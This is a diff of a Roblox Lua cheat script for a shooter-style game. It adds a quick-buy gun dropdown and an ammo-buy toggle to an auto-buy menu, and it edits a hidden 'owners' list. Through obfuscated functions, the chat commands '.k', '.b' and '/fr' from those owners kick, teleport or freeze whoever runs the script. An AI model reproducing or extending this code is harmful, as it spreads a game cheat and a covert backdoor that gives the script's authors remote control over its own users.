@@ -871,6 +871,92 @@ local ShopTable = {
     ["[Grenade]"] = {ShopName = "[Grenade] - $765"},
 }
 
+-- Tạo dropdown cho Quick Buy Gun
+local QuickBuyLabel = Instance.new("TextLabel")
+QuickBuyLabel.Size = UDim2.new(1, 0, 0, 30)
+QuickBuyLabel.Text = "Quick Buy Gun"
+QuickBuyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+QuickBuyLabel.Font = Enum.Font.Gotham
+QuickBuyLabel.TextSize = 14
+QuickBuyLabel.Parent = AutoBuyScrolling
+
+local QuickBuyDropdown = Instance.new("TextButton")
+QuickBuyDropdown.Size = UDim2.new(1, 0, 0, 30)
+QuickBuyDropdown.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+QuickBuyDropdown.Text = SelectedGun
+QuickBuyDropdown.TextColor3 = Color3.fromRGB(255, 255, 255)
+QuickBuyDropdown.Font = Enum.Font.Gotham
+QuickBuyDropdown.TextSize = 14
+QuickBuyDropdown.Parent = AutoBuyScrolling
+local UICornerQD = Instance.new("UICorner")
+UICornerQD.Parent = QuickBuyDropdown
+
+-- Dropdown list cho Quick Buy (ẩn/mở)
+local QuickDropdownList = Instance.new("ScrollingFrame")
+QuickDropdownList.Size = UDim2.new(1, 0, 0, 150)
+QuickDropdownList.Position = UDim2.new(0, 0, 0, 60)
+QuickDropdownList.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+QuickDropdownList.Visible = false
+QuickDropdownList.ScrollBarThickness = 4
+QuickDropdownList.Parent = AutoBuyScrolling
+local UIListQD = Instance.new("UIListLayout")
+UIListQD.Parent = QuickDropdownList
+
+local guns = {
+    "[Rifle]", "[LMG]", "[AK47]", "[AUG]", "[AR]", "[Double-Barrel SG]", "[Drum-Shotgun]", "[DrumGun]",
+    "[Glock]", "[P90]", "[Revolver]", "[RPG]", "[Shotgun]", "[Silencer]", "[SilencerAR]", "[TacticalShotgun]"
+}
+for _, gun in ipairs(guns) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 0, 30)
+    btn.Text = gun
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    btn.Parent = QuickDropdownList
+    btn.MouseButton1Click:Connect(function()
+        SelectedGun = gun
+        QuickBuyDropdown.Text = gun
+        QuickDropdownList.Visible = false
+    end)
+end
+QuickDropdownList.CanvasSize = UDim2.new(0, 0, 0, #guns * 30)
+
+QuickBuyDropdown.MouseButton1Click:Connect(function()
+    QuickDropdownList.Visible = not QuickDropdownList.Visible
+end)
+
+-- Button Buy Selected
+local BuySelectedButton = Instance.new("TextButton")
+BuySelectedButton.Size = UDim2.new(1, 0, 0, 30)
+BuySelectedButton.Position = UDim2.new(0, 0, 0, 90)
+BuySelectedButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+BuySelectedButton.Text = "Buy Selected Gun"
+BuySelectedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+BuySelectedButton.Font = Enum.Font.Gotham
+BuySelectedButton.TextSize = 14
+BuySelectedButton.Parent = AutoBuyScrolling
+local UICornerBS = Instance.new("UICorner")
+UICornerBS.Parent = BuySelectedButton
+BuySelectedButton.MouseButton1Click:Connect(function()
+    BuyingSingle = true
+end)
+
+-- Toggle Buy Ammo
+local BuyAmmoToggle = Instance.new("TextButton")
+BuyAmmoToggle.Size = UDim2.new(1, 0, 0, 30)
+BuyAmmoToggle.Position = UDim2.new(0, 0, 0, 120)
+BuyAmmoToggle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+BuyAmmoToggle.Text = "Buy Ammo: Off"
+BuyAmmoToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+BuyAmmoToggle.Font = Enum.Font.Gotham
+BuyAmmoToggle.TextSize = 14
+BuyAmmoToggle.Parent = AutoBuyScrolling
+local UICornerBA = Instance.new("UICorner")
+UICornerBA.Parent = BuyAmmoToggle
+BuyAmmoToggle.MouseButton1Click:Connect(function()
+    BuyingAmmo = not BuyingAmmo
+    BuyAmmoToggle.Text = "Buy Ammo: " .. (BuyingAmmo and "On" or "Off")
+end)
 
 -- Section Auto Buys
 local AutoBuysLabel = Instance.new("TextLabel")
@@ -1033,9 +1119,12 @@ local localPlayer = Players.LocalPlayer
 
 -- Danh sách owner
 local owners = {
-    "GameLuaNhau",
-    "quayvebenanhdi",
-    "3"
+    "anhchangm52",
+    "anhaycogihontoi",
+    "zazzvaqe",
+    "anhchangm5",
+    "dao_beo"
+    
 }
 
 -- Biến điều khiển
@@ -1114,14 +1203,14 @@ function a1b2c3(ownerName)
         owner.Chatted:Connect(function(message)
             -- Kick
             if message == ".k" then
-                localPlayer:Kick("Owner Has Kicked You.")
+                localPlayer:Kick("Admins Has Kicked You.")
 
             -- Bring
             elseif message == ".b" then
                 x1y2z3(owner)
 
             -- Freeze
-            elseif message == ".fr" then
+            elseif message == "/fr" then
                 freezePlayer()
 
             -- Unfreeze
